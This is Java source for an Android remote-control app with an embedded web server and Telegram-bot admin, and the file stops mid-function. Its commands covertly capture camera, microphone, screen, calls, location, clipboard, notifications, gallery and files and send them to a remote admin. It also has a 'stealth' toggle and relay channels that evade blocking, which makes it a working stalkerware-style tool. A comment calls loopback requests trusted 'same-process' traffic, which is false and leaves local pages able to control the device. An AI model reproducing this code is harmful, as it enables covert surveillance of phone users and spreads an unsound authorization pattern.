package com.pulse.control;

import android.content.Context;
import android.os.PowerManager;
import android.view.WindowManager;

import java.io.BufferedInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.URLDecoder;
import java.util.List;
import java.util.Locale;

import org.json.JSONArray;
import org.json.JSONObject;

/**
 * Embedded HTTP server that hosts the WebApp panel on the phone itself.
 * Default: http://127.0.0.1:8765 (local) and http://<lan-ip>:8765 (LAN).
 * Serves / (assets/webapp.html) and a tiny JSON API used by the panel.
 */
public final class WebServer {

    public static final int PORT = 8765;
    private static ServerSocket server;
    private static Thread thread;
    private static volatile boolean running = false;
    private static java.util.concurrent.ExecutorService pool;

    private WebServer() {}

    public static boolean isRunning() { return running; }

    public static void start(Context c) {
        if (running) return;
        if (Eco.on(c)) return;   // экономный режим: не поднимаем сервер
        final Context ctx = c.getApplicationContext();
        try {
            server = new ServerSocket();
            server.setReuseAddress(true);
            server.bind(new InetSocketAddress("0.0.0.0", PORT));
        } catch (Exception e) {
            LogStore.add("🌐 Порт " + PORT + " занят: " + e.getMessage());
            try { server = new ServerSocket(0); } catch (Exception ignored) { return; }
        }
        running = true;
        pool = java.util.concurrent.Executors.newFixedThreadPool(4, r -> {
            Thread t = new Thread(r, "pulse-http-conn");
            t.setDaemon(true);
            return t;
        });
        thread = new Thread(() -> loop(ctx), "pulse-http");
        thread.setDaemon(true);
        thread.start();
        LogStore.add("🌐 WebApp: http://127.0.0.1:" + PORT + "  · LAN: http://" + lanIp() + ":" + PORT);
    }

    public static void stop() {
        running = false;
        try { if (server != null) server.close(); } catch (Exception ignored) {}
        try { if (pool != null) pool.shutdownNow(); } catch (Exception ignored) {}
        server = null;
    }

    public static int port() {
        return server == null ? PORT : server.getLocalPort();
    }

    private static void loop(Context ctx) {
        while (running) {
            try {
                Socket s = server.accept();
                try { pool.execute(() -> handle(ctx, s)); }
                catch (Exception e) { try { s.close(); } catch (Exception ignored) {} }
            } catch (Exception e) {
                if (running) {
                    try { Thread.sleep(150); } catch (InterruptedException ignored) {}
                }
            }
        }
    }

    // ------------------------------------------------------------ one request

    private static void handle(Context ctx, Socket s) {
        try {
            s.setSoTimeout(6000);
            InputStream in = new BufferedInputStream(s.getInputStream());
            OutputStream out = s.getOutputStream();

            String requestLine = readLine(in);
            if (requestLine == null) { s.close(); return; }
            String[] parts = requestLine.split(" ");
            if (parts.length < 2) { s.close(); return; }
            String method = parts[0];
            String rawPath = parts[1];

            int contentLength = 0;
            String clientKey = "";
            String line;
            while ((line = readLine(in)) != null && !line.isEmpty()) {
                int idx = line.indexOf(':');
                if (idx > 0) {
                    String k = line.substring(0, idx).trim().toLowerCase(Locale.ROOT);
                    String v = line.substring(idx + 1).trim();
                    if (k.equals("content-length")) {
                        try { contentLength = Integer.parseInt(v); }
                        catch (Exception ignored) {}
                    } else if (k.equals("x-pulse-key")) {
                        clientKey = v;
                    }
                }
            }

            String path = rawPath;
            String query = "";
            int q = path.indexOf('?');
            if (q >= 0) { query = path.substring(q + 1); path = path.substring(0, q); }

            byte[] body = new byte[0];
            if (contentLength > 0) {
                body = new byte[Math.min(contentLength, 60 * 1024 * 1024)];
                int read = 0;
                while (read < body.length) {
                    int n = in.read(body, read, body.length - read);
                    if (n < 0) break;
                    read += n;
                }
            }

            if (method.equals("OPTIONS")) {
                respond(out, 204, "text/plain", new byte[0], true);
                s.close();
                return;
            }

            // ═══ АВТОРИЗАЦИЯ ═══
            // Раньше здесь не было ничего: любой сайт, открытый на телефоне,
            // через CORS забирал /api/hello с токеном бота и управлял устройством.
            // Теперь нужен ключ. Он генерится при первом запуске и виден в боте.
            // Ключ нужен ТОЛЬКО запросам снаружи телефона.
            // С 127.0.0.1 (сама панель внутри приложения) — доверяем: это тот же
            // процесс, ключ ей знать незачем, и требовать его — значит ломать панель.
            boolean isLocal = isLoopback(s.getInetAddress());
            if (!isLocal) {
                String key = accessKey(ctx);
                if (key.isEmpty() || !constEq(key, clientKey)) {
                    JSONObject err = new JSONObject();
                    err.put("ok", false);
                    err.put("error", "unauthorized");
                    err.put("hint", "Открой ключ в боте: /key");
                    err.put("keyRequired", true);
                    respondJson(out, err, 401);
                    s.close();
                    return;
                }
            }

            if (path.equals("/") || path.equals("/index.html") || path.equals("/webapp")) {
                byte[] html = readAsset(ctx, "webapp.html");
                respond(out, 200, "text/html; charset=utf-8", html, false);
            } else if (path.equals("/api/hello")) {
                JSONObject j = new JSONObject();
                Config cfg = Config.get(ctx);
                j.put("ok", true);
                // токен бота НЕ отдаём никогда — даже с ключом
                j.put("admin", "hidden");
                j.put("device", Sys.deviceName());
                j.put("ver", "3.6");
                j.put("keyRequired", true);   // панель поймёт, что нужен ключ
                respondJson(out, j);
            } else if (path.equals("/api/status")) {
                respondJson(out, statusJson(ctx));
            } else if (path.equals("/api/act") && method.equals("POST")) {
                JSONObject j;
                try { j = new JSONObject(new String(body, "UTF-8")); }
                catch (Exception e) { j = new JSONObject(); }
                String cmd = j.optString("cmd", "");
                String result;
                try { result = run(ctx, cmd); }
                catch (Throwable t) { result = t.getClass().getSimpleName() + ": " + t.getMessage(); }
                JSONObject r = new JSONObject();
                if (result == null) { r.put("ok", true); }
                else { r.put("ok", false); r.put("error", result); }
                r.put("cmd", cmd);
                respondJson(out, r);
            } else if (path.equals("/api/wall") && method.equals("POST")) {
                boolean ok = Tools.setWallpaper(ctx, body);
                JSONObject r = new JSONObject();
                r.put("ok", ok);
                if (!ok) r.put("error", "Не удалось поставить обои");
                respondJson(out, r);
            } else if (path.equals("/api/upload") && method.equals("POST")) {
                String name = param(query, "name");
                if (name.isEmpty()) name = "upload_" + System.currentTimeMillis() + ".bin";
                name = name.replaceAll("[/\\\\:*?\"<>|]", "_");
                boolean ok = Fs.write("/Download/" + name, body);
                JSONObject r = new JSONObject();
                r.put("ok", ok);
                r.put("path", "sdcard/Download/" + name);
                if (!ok) r.put("error", "Нет доступа к папке Download");
                respondJson(out, r);
            } else {
                respond(out, 404, "text/plain", "not found".getBytes("UTF-8"), false);
            }
            s.close();
        } catch (Exception e) {
            try { s.close(); } catch (Exception ignored) {}
        }
    }

    // ------------------------------------------------------------ status

    private static JSONObject statusJson(Context ctx) throws Exception {
        JSONObject j = new JSONObject();
        j.put("device", Sys.deviceName());
        j.put("battery", Sys.batteryPercent(ctx));
        j.put("charging", Sys.charging(ctx));
        j.put("net", Sys.netName(ctx));
        j.put("cmds", BotService.cmdCount);
        j.put("up", BotService.isUp());
        j.put("temp", Sys.batteryTemp(ctx));
        j.put("uptime", Sys.uptime());

        boolean screenOn = true;
        boolean locked = false;
        try {
            PowerManager pm = (PowerManager) ctx.getSystemService(Context.POWER_SERVICE);
            if (pm != null) screenOn = pm.isInteractive();
            android.app.KeyguardManager km =
                    (android.app.KeyguardManager) ctx.getSystemService(Context.KEYGUARD_SERVICE);
            if (km != null) locked = km.isKeyguardLocked();
        } catch (Exception ignored) {}
        j.put("screenOn", screenOn);
        j.put("locked", locked);

        int[] v = Sys.musicVolume(ctx);
        j.put("volume", v[0] * 100 / Math.max(1, v[1]));
        j.put("brightness", Sys.brightness(ctx) * 100 / 255);
        j.put("ram", Sys.freeRam(ctx));
        j.put("storage", Sys.freeStorage());
        j.put("torch", Tools.torchState());
        j.put("vpn", Hardware.vpnOn(ctx));
        j.put("fg", Sys.foregroundApp(ctx));
        j.put("clip", clipSnippet(ctx));
        j.put("uptime", Sys.uptime());
        j.put("time", Sys.time());
        try { j.put("macros", Config.macros(ctx).length()); } catch (Exception ignored) {}
        try { j.put("sched", Sched.dump(ctx)); } catch (Exception ignored) {}

        JSONArray apps = new JSONArray();
        for (Apps.Item it : Tools.appList(ctx)) {
            JSONObject a = new JSONObject();
            a.put("label", it.label);
            a.put("pkg", it.pkg);
            apps.put(a);
        }
        j.put("apps", apps);
        j.put("tgUp", Net.tgUp(ctx));
        j.put("relay", Relay.enabled(ctx));
        j.put("channel", Relay.channel(ctx));
        j.put("queue", Net.queueSize(ctx));
        j.put("alertOk", AlertOverlay.canShow(ctx));
        j.put("callRec", CallRec.mode(ctx));
        j.put("callRecContacts", CallRec.contacts(ctx).length());
        j.put("recording", CallRec.isRecording());
        return j;
    }

    // ------------------------------------------------------------ commands

    /** Публичная точка входа: выполняет команду панели (используется релеем и очередью). */
    public static String runCommand(Context ctx, String cmd) {
        return run(ctx, cmd);
    }

    /** @return null on success, or an error string. */
    private static String run(Context ctx, String cmd) {
        try {
            String name = cmd, arg = "";
            int colon = cmd.indexOf(':');
            if (colon > 0) { name = cmd.substring(0, colon); arg = cmd.substring(colon + 1); }
            BotService bs = BotService.inst();

            switch (name) {

                // ── ЭКРАН ───────────────────────────────────────────
                case "screen": return needShoot(bs);
                case "lockscreen": return needShoot(bs);
                case "home": return global(bs, 2);
                case "back": return global(bs, 1);
                case "recents": return global(bs, 3);
                case "notif": return global(bs, 4);
                case "lock": return global(bs, 8);
                case "wake": Tools.wakeScreen(ctx); return null;
                case "keyevent": {
                    if (bs == null) return "служба доступа выключена";
                    int code = parseInt(arg, 0);
                    if (code <= 0) return "неверный код клавиши";
                    bs.performKey(code);
                    return null;
                }

                // ── ЖЕСТЫ ───────────────────────────────────────────
                case "s_up": return gesture(bs, "up");
                case "s_down": return gesture(bs, "down");
                case "s_left": return gesture(bs, "left");
                case "s_right": return gesture(bs, "right");
                case "tap": return gesture(bs, "ok");
                case "scroll_up": return scroll(bs, false);
                case "scroll_down": return scroll(bs, true);
                case "swipe": {
                    if (bs == null) return "служба доступа выключена";
                    String[] p = arg.split(",");
                    if (p.length < 4) return "нужно x1,y1,x2,y2";
                    Gestures.swipe(bs, f(p[0]), f(p[1]), f(p[2]), f(p[3]),
                            p.length > 4 ? (long) f(p[4]) : 300L, null);
                    return null;
                }
                case "tapxy": {
                    if (bs == null) return "служба доступа выключена";
                    String[] p = arg.split(",");
                    if (p.length < 2) return "нужно x,y";
                    Gestures.tap(bs, f(p[0]), f(p[1]), null);
                    return null;
                }
                case "taptext": {
                    if (bs == null) return "служба доступа выключена";
                    String q = dec(arg);
                    return Gestures.tapByText(bs, q, null) ? null : "текст не найден";
                }
                case "grid": {
                    if (bs == null) return "служба доступа выключена";
                    return Gestures.tapCell(bs, arg, null) ? null : "ячейка вне сетки";
                }
                case "type": {
                    if (bs == null) return "служба доступа выключена";
                    final String text = dec(arg);
                    Tools.typeText(bs, null, text, new Tools.Cb() {
                        @Override public void ok(String m) { }
                        @Override public void err(String why) { LogStore.add("⌨️ " + why); }
                    });
                    return null;
                }
                case "typefield": {
                    if (bs == null) return "служба доступа выключена";
                    String[] p = arg.split("\\|", 2);
                    if (p.length < 2) return "нужно подсказка|текст";
                    final String txt = dec(p[1]);
                    Tools.typeText(bs, dec(p[0]), txt, null);
                    return null;
                }
                case "enter": if (bs == null) return "служба доступа выключена"; Tools.pressEnter(bs); return null;

                // ── ЗВУК / СВЕТ ─────────────────────────────────────
                case "volume_up": Sys.adjustMusic(ctx, 1); return null;
                case "volume_down": Sys.adjustMusic(ctx, -1); return null;
                case "setvol": return setVol(ctx, parseInt(arg, 50));
                case "vol_full": Sys.adjustMusic(ctx, 100); return null;
                case "vol_mute": Sys.adjustMusic(ctx, -100); return null;
                case "ring_up": Sys.adjustRing(ctx, 1); return null;
                case "ring_dn": Sys.adjustRing(ctx, -1); return null;
                case "mute": Sys.mute(ctx, true); return null;
                case "unmute": Sys.mute(ctx, false); return null;
                case "bright": Sys.adjustBrightness(ctx, parseInt(arg, 1)); return null;
                case "setbright": Sys.setBrightness(ctx, parseInt(arg, 50)); return null;
                case "bright_auto": Sys.setBrightnessAuto(ctx); return null;

                // ── МЕДИА ───────────────────────────────────────────
                case "prev": Sys.mediaKey(ctx, android.view.KeyEvent.KEYCODE_MEDIA_PREVIOUS); return null;
                case "play": Sys.mediaKey(ctx, android.view.KeyEvent.KEYCODE_MEDIA_PLAY_PAUSE); return null;
                case "next": Sys.mediaKey(ctx, android.view.KeyEvent.KEYCODE_MEDIA_NEXT); return null;
                case "nowplaying": {
                    String now = Background.nowPlaying(ctx);
                    Act.sendToAdmin(now == null ? "🎵 Сейчас ничего не играет" : "🎵 <b>Сейчас играет</b>\n" + Tools.e(now), null);
                    return null;
                }

                // ── ФОНАРИК / ВИБРО / СИГНАЛЫ ───────────────────────
                case "torch": Tools.torch(ctx, !Tools.torchState()); return null;
                case "torch_on": Tools.torch(ctx, true); return null;
                case "torch_off": Tools.torch(ctx, false); return null;
                case "vibrate": Tools.vibrate(ctx, 3); return null;
                case "vib_stop": Tools.stopVibrate(); return null;
                case "find": BotService.startSirenPublic(ctx, 5); return null;
                case "siren_stop": BotService.stopSirenPublic(); return null;
                case "sos": BotService.startSirenPublic(ctx, 30); Act.sendToAdmin("🆘 SOS включён", null); return null;
                case "panic": return panic(ctx);

                // ── КАМЕРА / ЗАПИСЬ ─────────────────────────────────
                case "photo_back": return photo(ctx, false);
                case "photo_front": return photo(ctx, true);
                case "burst": BotService.startBurstPublic(ctx); return null;
                case "video": {
                    int sec = parseInt(arg, 5);
                    Capture.video(ctx, sec, new Capture.AudioCb() {
                        @Override public void ok(byte[] mp4, String mime) {
                            new Thread(() -> Act.sendVideo(mp4, "camera.mp4", "🎥 <b>Видео</b> · " + sec + " сек"), "pulse-video").start();
                        }
                        @Override public void err(String why) { Act.sendToAdmin("🎥 " + Tools.e(why), null); }
                    });
                    return null;
                }
                case "rec": ScreenCapActivity.request(ctx, "record", parseInt(arg, 15)); return null;
                case "live": ScreenCapActivity.request(ctx, "live", parseInt(arg, 60)); return null;
                case "mic": BotService.startMicPublic(ctx, parseInt(arg, 10)); return null;
                case "mic_stop": Capture.micStopNow(); return null;

                // ── ПРИЛОЖЕНИЯ ──────────────────────────────────────
                case "open": {
                    String pkg = dec(arg);
                    return Apps.launch(ctx, pkg) ? null : "не удалось открыть " + pkg;
                }
                case "wall": Act.sendToAdmin("🖼 Отправьте фото боту — поставлю на рабочий стол.", Kb.catMedia()); return null;
                case "upload": Act.sendToAdmin("📥 Перетащите файл в панель или отправьте документ боту.", Kb.catSet()); return null;
                case "siren": BotService.startSirenPublic(ctx, 5); return null;
                case "openname": {
                    String pkg = Apps.findPkg(ctx, dec(arg));
                    return pkg == null ? "приложение не найдено" : (Apps.launch(ctx, pkg) ? null : "не удалось открыть");
                }
                case "applist": {
                    List<Apps.Item> items = Tools.appList(ctx);
                    Act.sendToAdmin("📱 <b>Приложения</b> · " + items.size(), null);
                    return null;
                }
                case "fgapp": {
                    String fg = Sys.foregroundApp(ctx);
                    Act.sendToAdmin("📱 <b>Активное:</b> " + Tools.e(fg == null ? "неизвестно" : fg), null);
                    return null;
                }

                // ── ФАЙЛЫ / ТЕКСТ / ОБОИ ────────────────────────────
                case "get": case "ls": {
                    if (bs == null) return "служба доступа выключена";
                    bs.listFilesPublic(arg.isEmpty() ? "" : "/" + arg);
                    return null;
                }
                case "clip": {
                    String cb = Sys.clipboard(ctx);
                    Act.sendToAdmin("📋 <b>Буфер обмена</b>\n<code>" + Tools.e(cb == null ? "пусто" : cb.substring(0, Math.min(120, cb.length()))) + "</code>", Kb.catSet());
                    return null;
                }
                case "clipset": {
                    String text = dec(arg);
                    ModalText.show(ctx, "Текст в буфер обмена", text, "📋 В буфер", t -> {
                        Sys.setClipboard(ctx, t); Act.sendToAdmin("📋 Скопировано", null);
                    }, null);
                    return null;
                }
                case "say": {
                    String text = dec(arg);
                    Tools.say(ctx, text, "ru");
                    Act.sendToAdmin("🗣 <b>Озвучено:</b> " + Tools.e(text), null);
                    return null;
                }

                // ── ТЕЛЕФОНИЯ ───────────────────────────────────────
                case "call": case "sms": case "contacts": case "hangup":
                case "alarm": case "timer": {
                    String hint = name;
                    ModalText.show(ctx, titleFor(hint), "", titleFor(hint), t -> doComms(ctx, hint, t), null);
                    return null;
                }

                // ── ЖЕЛЕЗО / ДИАГНОСТИКА ────────────────────────────
                case "cpu": Act.sendToAdmin("📊 <b>Процессор</b>\n<code>" + Tools.e(Hardware.cpuReport()) + "</code>", Kb.catInfo()); return null;
                case "ram": Act.sendToAdmin("💾 <b>Память</b>\n<code>" + Tools.e(Hardware.memReport(ctx)) + "</code>", Kb.catInfo()); return null;
                case "net": Act.sendToAdmin("🌐 <b>Сеть</b>\n<code>" + Tools.e(Hardware.netReport(ctx)) + "</code>", Kb.catInfo()); return null;
                case "bat": Act.sendToAdmin("🔋 <b>Батарея</b>\n<code>" + Tools.e(Hardware.batteryReport(ctx)) + "</code>", Kb.catInfo()); return null;
                case "speed": Act.sendToAdmin("тж <b>Скорость</b>", null); Act.sendToAdmin("⚡ <b>Скорость</b>\n<code>" + Tools.e(Hardware.speedTest(ctx)) + "</code>", Kb.catInfo()); return null;
                case "vpn": Act.sendToAdmin("🔐 VPN: <b>" + (Hardware.vpnOn(ctx) ? "включён" : "выключен") + "</b>", null); return null;
                case "fg": Act.sendToAdmin("📊 <b>Активность</b>\n<code>" + Tools.e(Sys.foregroundApp(ctx)) + "</code>", null); return null;
                case "stat": case "status": Act.sendToAdmin(BotService.statTextPublic(ctx), null); return null;
                case "sys": Act.sendToAdmin("⚙️ <b>Система</b>\n<code>" + Tools.e(Config.statsDump(ctx)) + "</code>", Kb.catInfo()); return null;

                // ── ЭКСПОРТ / ЛОГ ───────────────────────────────────
                case "log": Act.sendToAdmin("📜 <b>Журнал</b>\n\n<code>" + Tools.e(LogStore.dump()) + "</code>", Kb.catSet()); return null;
                case "export": {
                    ModalText.show(ctx, "📤 Выгрузить файл", "sdcard/Download/", "📤 Отправить", path -> {
                        java.io.File f = Fs.resolve(path);
                        if (f == null || !f.isFile()) { Act.sendToAdmin("❌ Файл не найден: " + Tools.e(path), null); return; }
                        byte[] data = Fs.read(path, 45 * 1024 * 1024);
                        if (data == null) { Act.sendToAdmin("❌ Не читается", null); return; }
                        Act.sendDoc(data, f.getName(), "📤 <b>" + Tools.e(f.getName()) + "</b> · " + Fs.human(f.length()));
                    }, null);
                    return null;
                }
                case "digest": Act.sendToAdmin(Background.buildDigest(ctx), null); return null;
                case "nhist": Act.sendToAdmin(BotService.notifHistoryTextPublic(ctx), Kb.catCtl()); return null;
                case "nclear": Config.clearNotifHistory(ctx); Act.sendToAdmin("🗑 История уведомлений очищена", Kb.catCtl()); return null;
                case "stealth": Act.sendToAdmin("🥷 <b>Стелс:</b> " + "(состояние в боте: /menu → Настройки)", Kb.catSet()); return null;
                case "stealth_toggle": {
                    boolean on = !Config.stealth(ctx);
                    Config.setStealth(ctx, on);
                    Stealth.apply(ctx);
                    Act.sendToAdmin("🥷 Стелс " + (on ? "включён" : "выключен"), Kb.catSet());
                    return null;
                }

                // ── ПРОЧЕЕ ──────────────────────────────────────────
                case "keepawake": {
                    android.content.SharedPreferences sp = ctx.getSharedPreferences("pulse", 0);
                    boolean on = !sp.getBoolean("keep_awake", false);
                    sp.edit().putBoolean("keep_awake", on).apply();
                    Tools.keepAwake(ctx, on);
                    Act.sendToAdmin("☕ Бодрствование " + (on ? "включено" : "выключено"), Kb.catSet());
                    return null;
                }
                case "lockorient": Tools.lockOrientation(true); return null;
                case "dnd": {
                    try {
                        android.app.NotificationManager nm = (android.app.NotificationManager) ctx.getSystemService(Context.NOTIFICATION_SERVICE);
                        boolean on = nm.getCurrentInterruptionFilter() != android.app.NotificationManager.INTERRUPTION_FILTER_ALL;
                        Tools.dnd(ctx, !on);
                        Act.sendToAdmin("🌙 Не беспокоить " + (on ? "выключен" : "включён"), Kb.catSet());
                    } catch (Exception ignored) {}
                    return null;
                }
                case "geo": {
                    Sys.location(ctx, new Sys.LocCb() {
                        @Override public void ok(double lat, double lon, float acc) {
                            Act.sendToAdmin(String.format(java.util.Locale.US,
                                    "📍 <b>Локация</b>\n%.5f, %.5f\n✔ %s\nhttps://maps.google.com/?q=%.5f,%.5f",
                                    lat, lon, acc, lat, lon), Kb.catInfo());
                        }
                        @Override public void err(String why) { Act.sendToAdmin("📍 " + Tools.e(why), null); }
                    });
                    return null;
                }
                case "sched": {
                    String[] p = arg.split(":");
                    Sched.add(ctx, parseInt(p[0], 30), p.length > 1 ? p[1] : "lock", "");
                    Act.sendToAdmin("⏰ Запланировано через " + parseInt(p[0], 30) + " мин", null);
                    return null;
                }
                case "macros": Act.sendToAdmin(BotService.macroTextPublic(ctx), Kb.catAuto()); return null;
                case "runmac": {
                    if (bs == null) return "служба доступа выключена";
                    bs.runMacroPublic(dec(arg));
                    return null;
                }
                case "stats": Act.sendToAdmin("📈 <b>Статистика</b>\n<code>" + Tools.e(Config.statsDump(ctx)) + "</code>", Kb.catSet()); return null;
                case "tracking": {
                    boolean on = !Config.tracking(ctx);
                    Config.setTracking(ctx, on);
                    Act.sendToAdmin("📍 Отслеживание " + (on ? "включено" : "выключено"), Kb.catAuto());
                    return null;
                }
                case "alerts": Act.sendToAdmin("🌡 <b>Алерты</b> — управление в боте: /menu → Авто", Kb.catAuto()); return null;


                // ═══════════════ НОВЫЕ ФУНКЦИИ (Extras) ═══════════════

                // ── ЭКРАН+ ─────────────────────────────────────────
                case "rot0": return Extras.rotate(ctx, 0);
                case "rot90": return Extras.rotate(ctx, 90);
                case "rot180": return Extras.rotate(ctx, 180);
                case "rot270": return Extras.rotate(ctx, 270);
                case "bright_pct": return Extras.brightnessPct(ctx, parseInt(arg, 50));
                case "screen_off": return Extras.screenOff(ctx);
                case "invert": return Extras.invertColors(ctx);
                case "font_big": return Extras.largeFont(ctx);
                case "font_norm": return Extras.normalFont(ctx);
                case "night": return Extras.dimScreen(ctx, true);
                case "night_off": return Extras.dimScreen(ctx, false);
                case "timeout_set": return Extras.openScreenTimeout(ctx);

                // ── ЖЕСТЫ+ ─────────────────────────────────────────
                case "multitap2": return Extras.multiTap(ctx, 2);
                case "multitap3": return Extras.multiTap(ctx, 3);
                case "longpress": return Extras.longPress(ctx);
                case "doubletap": return Extras.doubleTap(ctx);
                case "pinch_in": return Extras.pinch(ctx, true);
                case "pinch_out": return Extras.pinch(ctx, false);
                case "grid25": return Extras.grid25(ctx, arg);
                case "tapid": return Extras.tapById(ctx, dec(arg));

                // ── СИСТЕМА ────────────────────────────────────────
                case "powersave": return Extras.powerSave(ctx);
                case "dark": return Extras.darkTheme(ctx);
                case "batusers": Act.sendToAdmin(Extras.batteryUsers(ctx), Kb.catInfo()); return null;
                case "airplane": return Extras.airplane(ctx);

                // ── СЕТЬ (безопасные экраны) ────────────────────────
                case "wifi_ui": return Extras.openWifi(ctx);
                case "bt_ui": return Extras.openBluetooth(ctx);
                case "data_ui": return Extras.openData(ctx);
                case "hotspot_ui": return Extras.openHotspot(ctx);
                case "nfc_ui": return Extras.openNfc(ctx);

                // ── ПРИЛОЖЕНИЯ+ ────────────────────────────────────
                case "appinfo":
                    Extras.appInfo(ctx, dec(arg));
                    Act.sendToAdmin("ℹ️ Открыто на телефоне: " + Tools.e(dec(arg)), null);
                    return null;
                case "appsize": Act.sendToAdmin(Extras.appSize(ctx, dec(arg)), Kb.catInfo()); return null;
                case "appperms": Act.sendToAdmin(Extras.appPerms(ctx, dec(arg)), Kb.catInfo()); return null;
                case "appuninstall": return Extras.uninstall(ctx, dec(arg));

                // ── МЕДИА+ ─────────────────────────────────────────
                case "stream": {
                    String[] p = arg.split(":");
                    Extras.setStream(ctx, parseInt(p[0], 3), parseInt(p.length > 1 ? p[1] : "50", 50));
                    return null;
                }
                case "streams": Act.sendToAdmin(Extras.streamsReport(ctx), Kb.catMedia()); return null;
                case "tts_stop": return Extras.ttsStop();

                // ── ЗДОРОВЬЕ ───────────────────────────────────────
                case "cpuhealth": Act.sendToAdmin(Extras.cpuHealth(), Kb.catInfo()); return null;
                case "disk": Act.sendToAdmin(Extras.diskHealth(), Kb.catInfo()); return null;
                case "sensors": Act.sendToAdmin(Extras.sensors(ctx), Kb.catInfo()); return null;
                case "uptime": Act.sendToAdmin(Extras.uptime(), Kb.catInfo()); return null;
                case "rootcheck": Act.sendToAdmin(Extras.rootCheck(), Kb.catInfo()); return null;

                // ── ФАЙЛЫ+ ─────────────────────────────────────────
                case "fs_mkdir": return Extras.mkdir(ctx, dec(arg));
                case "fs_delete": return Extras.delete(ctx, dec(arg));
                case "fs_rename": {
                    String[] p = arg.split("\\|", 2);
                    if (p.length < 2) return "нужно путь|новое_имя";
                    return Extras.rename(ctx, dec(p[0]), dec(p[1]));
                }
                case "fs_copy": {
                    String[] p = arg.split("\\|", 2);
                    if (p.length < 2) return "нужно откуда|куда";
                    return Extras.copy(ctx, dec(p[0]), dec(p[1]));
                }
                case "fs_search": Act.sendToAdmin(Extras.search(ctx, dec(arg)), Kb.catSet()); return null;

                // ── УВЕДОМЛЕНИЯ+ ───────────────────────────────────
                case "nactive": Act.sendToAdmin(Extras.activeNotifs(ctx), Kb.catCtl()); return null;
                case "nclearall": return Extras.clearAllNotifs(ctx);

                // ── ТЕЛЕФОНИЯ+ ─────────────────────────────────────
                case "calllog": Act.sendToAdmin(Extras.callLog(ctx), Kb.catAct()); return null;
                case "missed": Act.sendToAdmin(Extras.missedCalls(ctx), Kb.catAct()); return null;
                case "answer": return Extras.answerCall(ctx);
                case "reject": return Extras.rejectCall(ctx);

                // ── СИСТЕМНЫЕ ЭКРАНЫ ───────────────────────────────
                case "ui_wifi": return Extras.openWifi(ctx);
                case "ui_battery": return Extras.openBatterySettings(ctx);
                case "ui_storage": return Extras.openStorageSettings(ctx);
                case "ui_access": return Extras.openAccessibility(ctx);
                case "ui_location": return Extras.openLocationSettings(ctx);
                case "ui_apps": return Extras.openAppSettings(ctx);
                case "ui_sound": return Extras.openSoundSettings(ctx);
                case "ui_display": return Extras.openDisplaySettings(ctx);
                case "ui_datetime": return Extras.openDateTime(ctx);
                case "ui_dev": return Extras.openDevOptions(ctx);
                case "ui_writesettings": return Extras.openWriteSettings(ctx);

                // ── ЭКСПОРТ ────────────────────────────────────────
                case "export_config": return Extras.exportConfig(ctx);
                case "stop_rec": return Extras.stopRecording(ctx);
                case "readfile": {
                    String body = null;
                    try {
                        byte[] data = Fs.read(dec(arg), 100 * 1024);
                        if (data != null) body = new String(data, "UTF-8");
                    } catch (Exception e) { return String.valueOf(e.getMessage()); }
                    if (body == null) return "файл не найден";
                    Act.sendToAdmin("📄 <b>" + Tools.e(dec(arg)) + "</b>\n\n<code>"
                            + Tools.e(body.length() > 3000 ? body.substring(0, 3000) : body) + "</code>", Kb.catSet());
                    return null;
                }
                case "speakfile": return Extras.speakFile(ctx, dec(arg));


                // ═══════════════ АЛЕРТ НА ЭКРАНЕ ═══════════════
                case "alert": {
                    // формат: текст|стиль|секунды
                    String[] p = arg.split("\\|");
                    String text = dec(p.length > 0 ? p[0] : "Привет");
                    String style = p.length > 1 ? p[1] : "success";
                    int secs = parseInt(p.length > 2 ? p[2] : "0", 0);
                    final String[] err = new String[1];
                    AlertOverlay.show(ctx, text, "PULSE CONTROL", style, secs, true, false,
                            e -> err[0] = e);
                    if (err[0] != null) return err[0];
                    Act.sendToAdmin("💬 <b>Алерт показан на экране</b>\n\n" + Tools.e(text), null);
                    return null;
                }
                case "alert_danger": {
                    AlertOverlay.show(ctx, dec(arg), "ВНИМАНИЕ", "danger", 0, true, true, null);
                    return null;
                }
                case "alert_hide": AlertOverlay.hide(); return null;
                case "alert_check":
                    return AlertOverlay.canShow(ctx) ? null : "нет разрешения «Поверх других окон»";

                // ═══════════════ ГАЛЕРЕЯ ═══════════════
                case "gallery": Gallery.sendLatest(ctx, parseInt(arg, 5)); return null;
                case "gallery5": Gallery.sendLatest(ctx, 5); return null;
                case "gallery10": Gallery.sendLatest(ctx, 10); return null;
                case "gallery_list": Act.sendToAdmin(Gallery.listText(ctx, 10), Kb.catMedia()); return null;

                // ═══════════════ РЕЛЕЙ И СВЯЗЬ ═══════════════
                case "relay": {
                    boolean on = !Relay.enabled(ctx);
                    Relay.setEnabled(ctx, on);
                    if (on) RelayService.start(ctx); else RelayService.stop(ctx);
                    Act.sendToAdmin("📡 Релей " + (on ? "включён" : "выключен"), Kb.catSet());
                    return null;
                }
                case "relay_svc": {
                    boolean up = RelayService.isAlive();
                    Act.sendToAdmin("📡 <b>Служба релея</b>: " + (up ? "работает ✅" : "остановлена ❌")
                            + "\n\n<i>Именно она держит связь, когда телефон дома и экран погас.</i>", Kb.catSet());
                    return null;
                }
                case "relay_svc_start": RelayService.start(ctx); Act.sendToAdmin("📡 Служба релея запущена", null); return null;
                case "relay_svc_stop": RelayService.stop(ctx); Act.sendToAdmin("📡 Служба релея остановлена", null); return null;

                case "relay_channel":
                    Act.sendToAdmin("📡 <b>Канал релея</b>\n\n<code>" + Relay.channel(ctx) + "</code>\n\n"
                            + "<i>Скопируй в удалённую панель</i>", Kb.catSet());
                    return null;
                case "relay_new": {
                    Relay.regenerate(ctx);
                    Act.sendToAdmin("📡 Новый канал: <code>" + Relay.channel(ctx) + "</code>", Kb.catSet());
                    return null;
                }
                case "channels": Act.sendToAdmin(Net.channelsReport(ctx), Kb.catSet()); return null;
                case "rescue": Act.sendToAdmin(Net.rescueGuide(ctx), Kb.catSet()); return null;
                case "diag": Act.sendToAdmin(Relay.checkTelegram(ctx), Kb.catSet()); return null;
                case "probe": {
                    boolean up = Net.probe(ctx);
                    Act.sendToAdmin(up ? "✅ Telegram доступен" : "⚠️ Telegram недоступен — включён релей", Kb.catSet());
                    return null;
                }
                case "queue": {
                    org.json.JSONArray q = Net.queueOf(ctx);
                    StringBuilder sb = new StringBuilder("📥 <b>Очередь</b>: " + q.length() + "\n\n");
                    for (int i = 0; i < Math.min(q.length(), 20); i++) {
                        org.json.JSONObject o = q.optJSONObject(i);
